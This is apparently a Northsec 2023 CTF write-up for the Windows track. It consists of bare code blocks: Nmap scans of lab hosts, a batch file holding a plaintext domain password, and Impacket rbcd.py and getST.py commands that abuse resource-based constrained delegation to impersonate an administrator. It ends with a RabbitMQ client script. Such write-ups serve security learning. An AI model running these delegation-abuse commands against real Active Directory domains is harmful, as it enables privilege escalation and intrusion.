# Windows Track Northsec 2023 Writeup

> 原文: https://www.ctfiot.com/123678.html
> ID: 123678


```
Nmap scan report for www.bank.ctf (9000:c1f3:fea4:dec1:216:3eff:fec1:d440)
Host is up (0.0080s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT STATE SERVICE
80/tcp open http
```



```
Nmap scan report for atm01.bank.ctf (9000:c1f3:fea4:dec1:216:3eff:fe13:ef28)
Host is up (0.018s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT STATE SERVICE
135/tcp open msrpc
445/tcp open microsoft-ds
5900/tcp open vnc
```



```
:RunUpdate.bat

:: Mounts the update server and pulls in all code updates.
:: This task is critical to keep the ATM running. Do not disable.

net use z: \\NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService
copy z:\software C:\Packages

net use * /delete

:: rot47
:: u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc
```



```
rbcd.py -action write -delegate-from 'webdev-old$' -delegate-to 'ATM01$' 'bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'`
```



```
getST.py -spn 'cifs/atm01.bank.ctf' -impersonate administrator -dc-ip 9000:c1f3:fea4:dec1:216:3eff:fea2:3b2d 'bank.ctf/webdev-old$:Emzmw^wimqRKy!bs#m5'`
```



```
Nmap scan report for 9000:c1f3:fea4:dec1:216:3eff:fe38:1827
Host is up, received user-set (0.013s latency).
Scanned at 2023-05-21 23:20:26 CEST for 15s

PORT STATE SERVICE REASON VERSION
5671/tcp open ssl/amqp syn-ack Advanced Message Queue Protocol
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
| ssl-cert: Subject: commonName=swiftmq.ctf
| Issuer: commonName=swift.ctf
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T16:59:44
| Not valid after: 2024-04-03T16:59:44
| MD5: 015ca8fb571aa123a2eeb589c44b2979
| SHA-1: e5192906ce40e5ab27bcec957f0ad3a3cccdc133
| -----BEGIN CERTIFICATE-----
| MIICsTCCAZkCFDWMaC2z1Rf7p4PDRJR7YlrIXypeMA0GCSqGSIb3DQEBCwUAMBQx
| EjAQBgNVBAMMCXN3aWZ0LmN0ZjAeFw0yMzA0MDQxNjU5NDRaFw0yNDA0MDMxNjU5
| NDRaMBYxFDASBgNVBAMMC3N3aWZ0bXEuY3RmMIIBIjANBgkqhkiG9w0BAQEFAAOC
| AQ8AMIIBCgKCAQEAhjBTDujgPahenSKZtPOj48feTihL2xOT8XgLPuuGHkcXyNYc
| OS/vuZrYVHL4rxWmKC6EHg+jiURKzzZ6cbwZFutgNfnM587u1vVAuofmibShE8AK
| k+3W9qxQNlpO46eD56Iu8tULLGOVbjHRSj07aiZMkUhs3WXHD41jTugLrkLjgV/I
| NytbIck+xdFWA266SqOU193dhYtmVaZyD9SMdMAuDh2Nj4qMWvCDt0wIqV+Bg5t3
| WX6vM08I79Gj5ojKsEm2nrdzlb8XrnGqedZ0BiyMfwhJXc4pIWfIpY3pXuTE956p
| OQiJuX1BkshcbUzksiOm6Dd3djWk3RBMYuYEJQIDAQABMA0GCSqGSIb3DQEBCwUA
| A4IBAQApSX7Vdt9+23p6sjf9osrN62NQ287sgf3LttQOowQFV9jfnr2+razeiAR8
| ZOQFHSQrYu5mJwkVnjkI/eoqnhgtIq0295UAYM7e0jDs/GMQ+vAPFdE2Ax1sbtaP
| GDYtOeBO20xEGmwiKYP8rcAshItG2J+C1ibouwvroo/uY0VeapptFFdV34IbQ66Z
| q2vfSucl8P9JLaAZ2imcucFcXoIteAUt9DCaj6tU+aHJ4l9GJk7UFfLakCr7E8R4
| fi6gAQ34hsex+GbR56bDK1xb4AB96MVwiO6xcZ0m8GlgoxFmPLowoAKx4zG3uMq7
| 49ydELaH82h07BD2hkVYc6PDyamp
|_-----END CERTIFICATE-----

Host script results:
| address-info:
| IPv6 EUI-64:
| MAC address:
| address: 00163e381827
|_ manuf: Xensource
```



```
import ssl
import pika
import logging

context = ssl.create_default_context(cafile="cert.pem")
context.verify_mode = ssl.CERT_REQUIRED
context.load_cert_chain("client-cert.pem","key.pem")
ssl_options = pika.SSLOptions(context, "swiftmq.ctf")
credentials = pika.credentials.ExternalCredentials()
conn_params = pika.ConnectionParameters(host="rabbitmq.bank.ctf",port=5671,ssl_options=ssl_options,credentials=credentials)

with pika.BlockingConnection(conn_params) as conn:
 ch = conn.channel()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/07/img_64a7671f081a3.png)